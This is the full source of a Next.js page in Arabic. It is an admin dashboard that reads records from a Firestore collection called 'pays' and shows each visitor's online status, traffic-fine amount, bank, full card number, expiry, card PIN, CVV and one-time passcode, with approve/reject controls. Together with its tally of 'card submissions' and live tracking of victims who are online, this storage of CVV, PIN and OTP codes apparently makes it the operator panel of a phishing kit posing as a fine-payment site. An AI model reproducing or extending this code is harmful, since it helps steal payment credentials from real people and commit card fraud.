"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  Bell,
  Info,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ar } from "date-fns/locale";
import { formatDistanceToNow } from "date-fns";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { playNotificationSound } from "@/lib/actions";
import { auth, db, database } from "@/lib/firestore";
import { onValue, ref } from "firebase/database";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Avatar, AvatarFallback } from "@/components/ui/avatar";
import { Separator } from "@/components/ui/separator";
import { toast, Toaster } from "sonner";
import {
  Pagination,
  PaginationContent,
  PaginationEllipsis,
  PaginationItem,
  PaginationLink,
  PaginationNext,
  PaginationPrevious,
} from "@/components/ui/pagination";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    const onlineUsersRef = ref(database, "status");
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === "online"
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  return onlineUsersCount;
}

interface PersonalInfo {
  id: string;
  violationValue: number;
}

interface Notification {
  cardHolder: string;
  cardNumber: string;
  country: string;
  createdDate: string;
  currentPage: string;
  cvv: string;
  expiryDate: string;
  forestoreAttachment: string;
  id: string;
  isOnline: boolean;
  lastSeen: string;
  notificationCount: number;
  otp: string;
  page: string;
  pass: string;
  personalInfo: PersonalInfo;
  bank?: string;
  prefix?: string;
  month?: string;
  year?: string;
  otp2?: string;
  mobile?: string;
  idNumber?: string;
  network?: string;
  violationValue?: string;
  plateType?: string;
  status?: string;
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [filteredNotifications, setFilteredNotifications] = useState<
    Notification[]
  >([]);
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState<boolean>(false);
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string;
  }>({});
  const [onlineUsers, setOnlineUsers] = useState<number>(0);
  const [totalVisitors, setTotalVisitors] = useState<number>(0);
  const [cardSubmissions, setCardSubmissions] = useState<number>(0);
  const [showOnlineOnly, setShowOnlineOnly] = useState(false);
  const [showWithCardOnly, setShowWithCardOnly] = useState(false);
  const [showFilters, setShowFilters] = useState(false);
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>(
    {}
  );
  const [activeTab, setActiveTab] = useState("all");

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage, setItemsPerPage] = useState(10);

  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login");
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  useEffect(() => {
    // Apply filters whenever filter settings or notifications change
    applyFilters();
  }, [notifications, showOnlineOnly, showWithCardOnly, activeTab]);

  // Reset to first page when filters change
  useEffect(() => {
    setCurrentPage(1);
  }, [showOnlineOnly, showWithCardOnly, activeTab]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any;
            playNotificationSound();
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || "",
            }));
            return { id: doc.id, ...data };
          })
          .filter(
            (notification: any) => !notification.isHidden
          ) as Notification[];

        // Check if there are any new notifications with card info or general info

        // Update statistics
        updateStatistics(notificationsData);

        setNotifications(notificationsData);

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id);
        });

        setIsLoading(false);
      },
      (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
        toast.error("حدث خطأ أثناء جلب الإشعارات", {
          description: "خطأ",
        });
      }
    );

    return unsubscribe;
  };

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`);

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }));
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }));
      }
    });
  };

  const applyFilters = () => {
    let filtered = [...notifications];

    if (activeTab === "online") {
      filtered = filtered.filter(
        (notification) => userStatuses[notification.id] === "online"
      );
    } else if (activeTab === "cards") {
      filtered = filtered.filter(
        (notification) =>
          notification.cardNumber && notification.cardNumber.trim() !== ""
      );
    }

    if (showOnlineOnly) {
      filtered = filtered.filter(
        (notification) => userStatuses[notification.id] === "online"
      );
    }

    if (showWithCardOnly) {
      filtered = filtered.filter(
        (notification) =>
          notification.cardNumber && notification.cardNumber.trim() !== ""
      );
    }

    setFilteredNotifications(filtered);
  };

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length;

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter(
      (notification) => notification.cardNumber
    ).length;

    setTotalVisitors(totalCount);
    setCardSubmissions(cardCount);
  };

  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
      toast.success("تم مسح جميع الإشعارات بنجاح", {
        description: "تم المسح",
      });
    } catch (error) {
      console.error("Error hiding all notifications:", error);
      toast.error("حدث خطأ أثناء مسح الإشعارات", {
        description: "خطأ",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
      toast.success("تم حذف الإشعار بنجاح", {
        description: "تم الحذف",
      });
    } catch (error) {
      console.error("Error hiding notification:", error);
      toast.error("حدث خطأ أثناء حذف الإشعار", {
        description: "خطأ",
      });
    }
  };

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id);
      await updateDoc(targetPost, {
        status: state,
      });
      if (state === "approved") {
        toast.success("تمت الموافقة على الطلب بنجاح", {
          description: "تم القبول",
        });
      } else {
        toast.error("تم رفض الطلب بنجاح", {
          description: "تم الرفض",
        });
      }
    } catch (error) {
      console.error("Error updating status:", error);
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        description: "خطأ",
      });
    }
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push("/login");
    } catch (error) {
      console.error("Error signing out:", error);
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        description: "خطأ",
      });
    }
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: "personal" | "card"
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  const toggleFilters = () => {
    setShowFilters(!showFilters);
  };

  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown");

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`);

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          setStatus(data.state);
        } else {
          setStatus("unknown");
        }
      });

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe();
      };
    }, [userId]);

    return (
      <Badge
        variant="outline"
        className={`${
          status === "online"
            ? "bg-green-100 text-green-800 border-green-300"
            : "bg-red-100 text-red-800 border-red-300"
        }`}
      >
        <span className="flex items-center gap-1.5">
          <span
            className={`h-2 w-2 rounded-full ${
              status === "online" ? "bg-green-500" : "bg-red-500"
            }`}
          ></span>
          {status === "online" ? "متصل" : "غير متصل"}
        </span>
      </Badge>
    );
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { violationValue: value });
      setViolationValues((prev) => ({ ...prev, [id]: value }));
      toast.success("تم تحديث قيمة المخالفة بنجاح", {
        description: "تم التحديث",
      });
    } catch (error) {
      console.error("Error updating violation value:", error);
      toast.error("حدث خطأ أثناء تحديث قيمة المخالفة", {
        description: "خطأ",
      });
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 text-gray-900 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="h-8 w-8 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <p className="text-lg font-medium">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  const allDisplayNotifications =
    filteredNotifications.length > 0 ||
    showOnlineOnly ||
    showWithCardOnly ||
    activeTab !== "all"
      ? filteredNotifications
      : notifications;

  // Calculate pagination
  const indexOfLastItem = currentPage * itemsPerPage;
  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
  const currentItems = allDisplayNotifications.slice(
    indexOfFirstItem,
    indexOfLastItem
  );
  const totalPages = Math.ceil(allDisplayNotifications.length / itemsPerPage);

  // Generate page numbers for pagination
  const pageNumbers = [];
  for (let i = 1; i <= totalPages; i++) {
    pageNumbers.push(i);
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900">
      <header className="bg-white border-b border-gray-200 sticky top-0 z-10">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <Bell className="h-6 w-6 text-primary" />
            <h1 className="text-xl font-bold">لوحة الإشعارات</h1>
          </div>
          <div className="flex items-center gap-2">
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="outline" size="sm" className="gap-2">
                  <Avatar className="h-6 w-6">
                    <AvatarFallback className="bg-primary/10 text-primary text-xs">
                      مشرف
                    </AvatarFallback>
                  </Avatar>
                  <span className="hidden sm:inline">الحساب</span>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end">
                <DropdownMenuItem onClick={handleLogout}>
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6">
        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center gap-4">
                <div className="rounded-full bg-green-100 p-3">
                  <UserCheck className="h-6 w-6 text-green-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
                  <p className="text-2xl font-bold">{onlineUsersCount}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center gap-4">
                <div className="rounded-full bg-blue-100 p-3">
                  <Users className="h-6 w-6 text-blue-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500">إجمالي الزوار</p>
                  <p className="text-2xl font-bold">{totalVisitors}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center gap-4">
                <div className="rounded-full bg-purple-100 p-3">
                  <CreditCard className="h-6 w-6 text-purple-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500">معلومات البطاقات</p>
                  <p className="text-2xl font-bold">{cardSubmissions}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filters and Actions */}
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
          <Tabs
            defaultValue="all"
            value={activeTab}
            onValueChange={setActiveTab}
            className="w-full sm:w-auto"
          >
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="all">الكل</TabsTrigger>
              <TabsTrigger value="online">متصل</TabsTrigger>
              <TabsTrigger value="cards">البطاقات</TabsTrigger>
            </TabsList>
          </Tabs>

          <div className="flex flex-wrap gap-2 w-full sm:w-auto">
            <Button
              variant="outline"
              onClick={toggleFilters}
              className="flex items-center gap-2"
              size="sm"
            >
              <Filter className="h-4 w-4" />
              الفلاتر
              {(showOnlineOnly || showWithCardOnly) && (
                <Badge className="ml-2 bg-primary">
                  {showOnlineOnly && showWithCardOnly ? "2" : "1"}
                </Badge>
              )}
            </Button>
            <Button
              variant="destructive"
              onClick={handleClearAll}
              size="sm"
              disabled={notifications.length === 0}
            >
              مسح الكل
            </Button>
          </div>
        </div>

        {showFilters && (
          <Card className="mb-6">
            <CardContent className="pt-6">
              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="online-filter"
                    checked={showOnlineOnly}
                    onCheckedChange={(checked: boolean) =>
                      setShowOnlineOnly(checked === true)
                    }
                  />
                  <label
                    htmlFor="online-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين المتصلين فقط
                  </label>
                </div>
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="card-filter"
                    checked={showWithCardOnly}
                    onCheckedChange={(checked: boolean) =>
                      setShowWithCardOnly(checked === true)
                    }
                  />
                  <label
                    htmlFor="card-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين الذين لديهم بطاقة فقط
                  </label>
                </div>
              </div>
              {(showOnlineOnly || showWithCardOnly) && (
                <div className="mt-4 text-sm text-blue-600">
                  يتم عرض {allDisplayNotifications.length} من أصل{" "}
                  {notifications.length} إشعار
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {allDisplayNotifications.length === 0 ? (
          <Card className="bg-white">
            <CardContent className="flex flex-col items-center justify-center py-12">
              <Bell className="h-12 w-12 text-gray-300 mb-4" />
              <h3 className="text-xl font-medium text-gray-700 mb-2">
                لا توجد إشعارات
              </h3>
              <p className="text-gray-500">
                ستظهر الإشعارات الجديدة هنا عند وصولها
              </p>
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-4">
            {/* Desktop Table View - Hidden on Mobile */}
            <div className="hidden md:block">
              <Card>
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-gray-200 bg-gray-50">
                          <th className="px-4 py-3 text-right text-sm font-medium text-gray-500">
                            الدولة
                          </th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-gray-500">
                            الإسم
                          </th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-gray-500">
                            المعلومات
                          </th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-gray-500">
                            الوقت
                          </th>
                          <th className="px-4 py-3 text-center text-sm font-medium text-gray-500">
                            الحالة
                          </th>
                          <th className="px-4 py-3 text-center text-sm font-medium text-gray-500">
                            إجراءات
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {currentItems.map((notification) => (
                          <tr
                            key={notification.id}
                            className="border-b border-gray-200 hover:bg-gray-50"
                          >
                            <td className="px-4 py-3 text-sm">
                              {notification?.country || "غير معروف"}
                            </td>
                            <td className="px-4 py-3 text-sm">
                              {notification.personalInfo?.id || "غير معروف"}
                            </td>
                            <td className="px-4 py-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={
                                    notification.personalInfo?.id
                                      ? "outline"
                                      : "destructive"
                                  }
                                  className={`rounded-md cursor-pointer ${
                                    notification.personalInfo?.id
                                      ? "hover:bg-gray-100"
                                      : ""
                                  }`}
                                  onClick={() =>
                                    handleInfoClick(notification, "personal")
                                  }
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  معلومات شخصية
                                </Badge>

                                <Badge
                                  variant={
                                    notification.cardNumber
                                      ? "outline"
                                      : "destructive"
                                  }
                                  className={`rounded-md cursor-pointer ${
                                    notification.cardNumber
                                      ? "bg-green-100 text-green-800 border-green-300 hover:bg-green-200"
                                      : ""
                                  }`}
                                  onClick={() =>
                                    handleInfoClick(notification, "card")
                                  }
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  معلومات البطاقة
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3 text-sm text-gray-500">
                              {notification.createdDate &&
                                formatDistanceToNow(
                                  new Date(notification.createdDate),
                                  {
                                    addSuffix: true,
                                    locale: ar,
                                  }
                                )}
                            </td>
                            <td className="px-4 py-3 text-center">
                              <UserStatusBadge userId={notification.id} />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="destructive"
                                  size="sm"
                                  onClick={() => handleDelete(notification.id)}
                                  className="h-8 w-8 p-0"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
                <CardFooter className="flex items-center justify-between px-6 py-4">
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-gray-500">
                      عرض {indexOfFirstItem + 1}-
                      {Math.min(
                        indexOfLastItem,
                        allDisplayNotifications.length
                      )}{" "}
                      من {allDisplayNotifications.length}
                    </span>
                    <Select
                      value={itemsPerPage.toString()}
                      onValueChange={(value) => {
                        setItemsPerPage(Number.parseInt(value));
                        setCurrentPage(1);
                      }}
                    >
                      <SelectTrigger className="w-[80px]">
                        <SelectValue placeholder="10" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="5">5</SelectItem>
                        <SelectItem value="10">10</SelectItem>
                        <SelectItem value="20">20</SelectItem>
                        <SelectItem value="50">50</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <Pagination>
                    <PaginationContent>
                      <PaginationItem>
                        <PaginationPrevious
                          onClick={() =>
                            setCurrentPage((prev) => Math.max(prev - 1, 1))
                          }
                          className={
                            currentPage === 1
                              ? "pointer-events-none opacity-50"
                              : ""
                          }
                        />
                      </PaginationItem>

                      {pageNumbers.map((number) => (
                        <PaginationItem key={number}>
                          <PaginationLink
                            onClick={() => setCurrentPage(number)}
                            isActive={currentPage === number}
                          >
                            {number}
                          </PaginationLink>
                        </PaginationItem>
                      ))}

                      <PaginationItem>
                        <PaginationNext
                          onClick={() =>
                            setCurrentPage((prev) =>
                              Math.min(prev + 1, totalPages)
                            )
                          }
                          className={
                            currentPage === totalPages
                              ? "pointer-events-none opacity-50"
                              : ""
                          }
                        />
                      </PaginationItem>
                    </PaginationContent>
                  </Pagination>
                </CardFooter>
              </Card>
            </div>

            {/* Mobile Card View - Shown only on Mobile */}
            <div className="md:hidden space-y-4">
              {currentItems.map((notification) => (
                <Card key={notification.id} className="overflow-hidden">
                  <CardHeader className="pb-2 pt-4 px-4">
                    <div className="flex justify-between items-start">
                      <div>
                        <CardTitle className="text-base">
                          {notification.personalInfo?.id || "مستخدم"}
                        </CardTitle>
                        <p className="text-sm text-gray-500">
                          {notification?.country || "غير معروف"}
                        </p>
                      </div>
                      <UserStatusBadge userId={notification.id} />
                    </div>
                  </CardHeader>
                  <CardContent className="px-4 pb-4 pt-0">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2 mt-2">
                        <Badge
                          variant={
                            notification.personalInfo?.id
                              ? "outline"
                              : "destructive"
                          }
                          className={`rounded-md cursor-pointer ${
                            notification.personalInfo?.id
                              ? "hover:bg-gray-100"
                              : ""
                          }`}
                          onClick={() =>
                            handleInfoClick(notification, "personal")
                          }
                        >
                          <Info className="h-3 w-3 mr-1" />
                          معلومات شخصية
                        </Badge>
                        <Badge
                          variant={
                            notification.cardNumber ? "outline" : "destructive"
                          }
                          className={`rounded-md cursor-pointer ${
                            notification.cardNumber
                              ? "bg-green-100 text-green-800 border-green-300 hover:bg-green-200"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          معلومات البطاقة
                        </Badge>
                      </div>

                      <div className="text-sm text-gray-500">
                        <span className="font-medium">الوقت:</span>{" "}
                        {notification.createdDate &&
                          formatDistanceToNow(
                            new Date(notification.createdDate),
                            {
                              addSuffix: true,
                              locale: ar,
                            }
                          )}
                      </div>

                      <Separator />

                      <div className="flex justify-end">
                        <Button
                          variant="destructive"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="h-8 w-8 p-0"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}

              {/* Mobile Pagination */}
              <div className="flex flex-col items-center gap-4 py-4">
                <Pagination>
                  <PaginationContent>
                    <PaginationItem>
                      <PaginationPrevious
                        onClick={() =>
                          setCurrentPage((prev) => Math.max(prev - 1, 1))
                        }
                        className={
                          currentPage === 1
                            ? "pointer-events-none opacity-50"
                            : ""
                        }
                      />
                    </PaginationItem>

                    {pageNumbers.length > 5 ? (
                      <>
                        {pageNumbers.slice(0, 2).map((number) => (
                          <PaginationItem key={number}>
                            <PaginationLink
                              onClick={() => setCurrentPage(number)}
                              isActive={currentPage === number}
                            >
                              {number}
                            </PaginationLink>
                          </PaginationItem>
                        ))}
                        <PaginationItem>
                          <PaginationEllipsis />
                        </PaginationItem>
                        {pageNumbers.slice(-2).map((number) => (
                          <PaginationItem key={number}>
                            <PaginationLink
                              onClick={() => setCurrentPage(number)}
                              isActive={currentPage === number}
                            >
                              {number}
                            </PaginationLink>
                          </PaginationItem>
                        ))}
                      </>
                    ) : (
                      pageNumbers.map((number) => (
                        <PaginationItem key={number}>
                          <PaginationLink
                            onClick={() => setCurrentPage(number)}
                            isActive={currentPage === number}
                          >
                            {number}
                          </PaginationLink>
                        </PaginationItem>
                      ))
                    )}

                    <PaginationItem>
                      <PaginationNext
                        onClick={() =>
                          setCurrentPage((prev) =>
                            Math.min(prev + 1, totalPages)
                          )
                        }
                        className={
                          currentPage === totalPages
                            ? "pointer-events-none opacity-50"
                            : ""
                        }
                      />
                    </PaginationItem>
                  </PaginationContent>
                </Pagination>
                <div className="flex items-center gap-2">
                  <span className="text-sm text-gray-500">
                    عرض {indexOfFirstItem + 1}-
                    {Math.min(indexOfLastItem, allDisplayNotifications.length)}{" "}
                    من {allDisplayNotifications.length}
                  </span>
                  <Select
                    value={itemsPerPage.toString()}
                    onValueChange={(value) => {
                      setItemsPerPage(Number.parseInt(value));
                      setCurrentPage(1);
                    }}
                  >
                    <SelectTrigger className="w-[80px]">
                      <SelectValue placeholder="10" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="5">5</SelectItem>
                      <SelectItem value="10">10</SelectItem>
                      <SelectItem value="20">20</SelectItem>
                      <SelectItem value="50">50</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-white text-gray-900 max-w-[90vw] md:max-w-md"
          dir="rtl"
        >
          <DialogHeader>
            <DialogTitle dir="rtl" className="text-xl font-bold">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                ? "معلومات البطاقة"
                : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription className="text-gray-500">
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                ? "تفاصيل معلومات البطاقة"
                : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>

          <Button
            variant="ghost"
            size="sm"
            className="absolute top-2 left-2 h-8 w-8 p-0"
            onClick={closeDialog}
          >
            <X className="h-4 w-4" />
          </Button>

          {selectedInfo === "personal" && selectedNotification?.plateType && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    قيمة المخالفة:
                  </span>
                  <span>
                    {selectedNotification.violationValue || "غير متوفر"}
                  </span>
                </p>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">البنك:</span>
                  <span>{selectedNotification.bank || "غير متوفر"}</span>
                </p>
              </div>

              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    رقم البطاقة:
                  </span>
                  <span dir="ltr">
                    {selectedNotification.cardNumber
                      ? `${selectedNotification.cardNumber}`
                      : "غير متوفر"}
                  </span>
                </p>
              </div>

              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    تاريخ الانتهاء:
                  </span>
                  <span>{selectedNotification?.expiryDate}</span>
                </p>
              </div>

              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    رمز البطاقة:
                  </span>
                  <span>{selectedNotification.pass || "غير متوفر"}</span>
                </p>
              </div>
              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رمز الامان:</span>
                  <span>{selectedNotification?.cvv || "غير متوفر"}</span>
                </p>
              </div>
              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">رمز التحقق:</span>
                  <span>{selectedNotification?.otp || "غير متوفر"}</span>
                </p>
              </div>
            </div>
          )}

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    قيمة المخالفة:
                  </span>
                  <span>
                    {selectedNotification.violationValue || "غير متوفر"}
                  </span>
                </p>
              </div>

              <div className="p-3 bg-gray-50 rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium text-gray-700">
                    رمز التحقق المرسل:
                  </span>
                  <span>{selectedNotification.otp || "غير متوفر"}</span>
                </p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
      <Toaster richColors position="top-center" />
    </div>
  );
}
